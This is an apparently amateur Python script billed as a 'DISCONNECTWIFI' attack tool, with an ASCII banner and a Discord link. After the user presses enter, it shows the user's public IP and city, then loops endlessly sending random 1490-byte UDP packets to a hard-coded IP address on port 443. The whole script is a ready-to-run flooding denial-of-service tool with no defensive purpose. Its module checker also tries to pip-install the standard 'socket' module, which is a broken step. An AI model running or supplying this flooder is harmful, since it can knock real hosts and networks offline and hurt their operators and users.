import random
import getpass
import datetime
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import os

discordlink = "https://dsc.gg/bmssupport"
owners = "BFHMSC SKRIPT KITTY"
date = datetime.datetime.now()
date_now = date.strftime("%d/%m/%Y")
program = "DISCONNECTWIFI"


#################
ip = "188.114.97.2"
port = 443
#################

os.system(f"cls & mode 180, 35 & title Made By {owners} - Date : {date_now} DISCORD : {discordlink} PROGRAM {program}")
print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter("""

▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ███▄    █  ███▄    █ ▓█████  ▄████▄  ▄▄▄█████▓    █     █░ ██▓  █████▒██▓
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒   ▓█░ █ ░█░▓██▒▓██   ▒▓██▒
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▒▓█    ▄ ▒ ▓██░ ▒░   ▒█░ █ ░█ ▒██▒▒████ ░▒██▒
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░    ░█░ █ ░█ ░██░░▓█▒  ░░██░
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░▒██░   ▓██░░▒████▒▒ ▓███▀ ░  ▒██▒ ░    ░░██▒██▓ ░██░░▒█░   ░██░
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░      ░ ▓░▒ ▒  ░▓   ▒ ░   ░▓  
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░  ▒       ░         ▒ ░ ░   ▒ ░ ░      ▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░    ░   ░          ░           ░   ░   ▒ ░ ░ ░    ▒ ░
   ░     ░        ░  ░ ░          ░ ░           ░          ░    ░  ░░ ░                      ░     ░          ░  
 ░                   ░                                              ░                                            

               
    """)))


def socket_run():
	import socket; import os; import requests
	print()
	Write.Input("  PLS PRESS ENTER TO START ATTACK .... ", Colors.blue_to_purple, interval=0.05)
	print()
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter("""                  ------- INFO -------""")))
	print()
	res = requests.get('https://ipinfo.io/json').json()
	ip_address = res['ip']
	hostname = res['hostname']
	city = res['city']
	print('    IP Address : ' + ip_address)
	print('    Hostname   : ' + hostname)
	print('    City       : ' + city)
	print()
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter("""  WORKING...""")))
	
	while True:
		bs = random._urandom(1490)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(bs, (ip,port))
		
		#print(f"BFHMSC THREADS : ",g)

def module_checker():
	try:
		import socket; import os
	except ImportError:
		os.system("clear")
		os.system("pip install socket")

module_checker()

if __name__ == '__main__':
	socket_run()
